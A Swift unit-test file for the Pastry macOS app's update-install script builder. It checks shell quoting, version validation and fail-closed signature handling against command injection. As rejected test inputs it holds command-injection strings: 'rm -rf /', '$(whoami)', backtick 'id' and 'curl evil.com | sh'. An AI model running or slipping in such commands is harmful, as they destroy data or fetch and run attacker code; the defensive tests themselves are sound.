import XCTest
@testable import Pastry

/// 更新安装脚本：外部版本号/路径注入防护。
final class UpdateInstallScriptBuilderTests: XCTestCase {

    // MARK: - shellQuote

    func testShellQuoteWrapsSimpleString() {
        XCTAssertEqual(UpdateInstallScriptBuilder.shellQuote("hello"), "'hello'")
    }

    func testShellQuoteEscapesEmbeddedSingleQuotes() {
        // 'foo'bar' → 'foo'\''bar'
        let quoted = UpdateInstallScriptBuilder.shellQuote("foo'bar")
        XCTAssertEqual(quoted, "'foo'\\''bar'")
    }

    func testShellQuoteEmptyString() {
        XCTAssertEqual(UpdateInstallScriptBuilder.shellQuote(""), "''")
    }

    // MARK: - isValidVersionString

    func testValidVersionStrings() {
        XCTAssertTrue(UpdateInstallScriptBuilder.isValidVersionString("1.0.0"))
        XCTAssertTrue(UpdateInstallScriptBuilder.isValidVersionString("1.8.4"))
        XCTAssertTrue(UpdateInstallScriptBuilder.isValidVersionString("10.20.30"))
    }

    func testInvalidVersionStringsRejected() {
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString(""))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0;rm -rf /"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0$(whoami)"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0`id`"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("v1.0.0"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0-beta"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0\n2"))
    }

    // MARK: - script assembly

    func testScriptUsesQuotedPathsAndSanitizedVersion() {
        let script = UpdateInstallScriptBuilder.script(
            stableDMGPath: "/tmp/Pastry.dmg",
            targetPath: "/Applications/Pastry.app",
            expectedVersion: "1.2.3",
            updateDirectory: "/Users/x/Library/Application Support/Pastry"
        )
        XCTAssertTrue(script.contains("DMG='/tmp/Pastry.dmg'"))
        XCTAssertTrue(script.contains("TARGET='/Applications/Pastry.app'"))
        XCTAssertTrue(script.contains("EXPECTED_VERSION=\"1.2.3\""))
        XCTAssertTrue(script.hasPrefix("#!/bin/bash"))
    }

    func testScriptKeepsDiagnosticsInsideAppDirectory() {
        let script = UpdateInstallScriptBuilder.script(
            stableDMGPath: "/tmp/Pastry.dmg",
            targetPath: "/Applications/Pastry.app",
            expectedVersion: "1.2.3",
            updateDirectory: "/Users/x/Library/Application Support/Pastry"
        )

        XCTAssertTrue(script.contains("UPDATE_DIR='/Users/x/Library/Application Support/Pastry'"))
        XCTAssertTrue(script.contains(#"LOG="$UPDATE_DIR/update.log""#))
        XCTAssertTrue(script.contains(#"ERROR_FILE="$UPDATE_DIR/update_error.txt""#))
        // /tmp 是固定且世界可写的路径：其他本机账户可伪造「更新失败」文本并在应用窗口里展示
        XCTAssertFalse(script.contains("/tmp/pastry_update_error.txt"))
        XCTAssertFalse(script.contains("/tmp/pastry_update.log"))
    }

    func testScriptFailsClosedWhenCurrentSignatureRequirementUnreadable() {
        let script = UpdateInstallScriptBuilder.script(
            stableDMGPath: "/tmp/Pastry.dmg",
            targetPath: "/Applications/Pastry.app",
            expectedVersion: "1.2.3",
            updateDirectory: "/Users/x/Library/Application Support/Pastry"
        )

        XCTAssertTrue(script.contains("fail_update \"无法读取当前 App 的签名要求，拒绝自动更新\""))
        XCTAssertFalse(
            script.contains("跳过签名身份连续性校验"),
            "读不到 designated requirement 时必须拒绝，而不是降级为只校验签名有效性"
        )
    }

    func testScriptDetachFailureDoesNotSkipRelaunch() {
        let script = UpdateInstallScriptBuilder.script(
            stableDMGPath: "/tmp/Pastry.dmg",
            targetPath: "/Applications/Pastry.app",
            expectedVersion: "1.2.3",
            updateDirectory: "/Users/x/Library/Application Support/Pastry"
        )

        // set -e 下 detach 失败会中断脚本，导致更新完成后应用不再启动
        XCTAssertTrue(script.contains(#"hdiutil detach "$VOLUME" -quiet || true"#))
    }

    func testScriptRejectsMaliciousVersionToSafeFallback() {
        let script = UpdateInstallScriptBuilder.script(
            stableDMGPath: "/tmp/x.dmg",
            targetPath: "/Applications/Pastry.app",
            expectedVersion: "1.0.0; curl evil.com | sh",
            updateDirectory: "/tmp"
        )
        XCTAssertTrue(
            script.contains("EXPECTED_VERSION=\"0.0.0\""),
            "非法版本号应回落 0.0.0，不得原样写入脚本"
        )
        XCTAssertFalse(script.contains("curl evil.com"))
    }

    func testScriptQuotesPathWithSingleQuote() {
        let script = UpdateInstallScriptBuilder.script(
            stableDMGPath: "/tmp/a'b.dmg",
            targetPath: "/Applications/Pastry.app",
            expectedVersion: "1.0.0",
            updateDirectory: "/tmp/it's here"
        )
        XCTAssertTrue(script.contains("DMG='/tmp/a'\\''b.dmg'"))
        XCTAssertTrue(script.contains("UPDATE_DIR='/tmp/it'\\''s here'"))
    }
}
